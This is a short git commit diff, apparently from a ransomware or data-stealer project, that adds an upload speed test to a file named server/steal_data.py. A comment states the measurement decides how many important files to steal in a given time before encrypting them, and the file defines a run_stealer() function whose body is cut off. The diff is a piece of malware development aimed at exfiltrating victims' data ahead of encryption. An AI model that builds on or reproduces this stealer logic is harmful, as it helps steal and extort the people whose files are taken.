045fb8b1cd9e74082e97814773702250820e0be2
Vincent <vincent24022002@icloud.com>
2026-05-17 22:10:25 +0200

    add speedtest (upload)

--- server/steal_data.py
+++ server/steal_data.py
@@ -1,4 +1,16 @@
 import subprocess
+import speedtest
+
+s = speedtest.Speedtest()
+
+s.get_best_server()
+
+UPLOAD = s.upload()
+
+print(f"{UPLOAD / 1_000_000:.2f} Mbit/s")
+# to define how much data (importent files) to steal in x (time) before encrypt
+
+
 
 def run_stealer():
     result = subprocess.run(
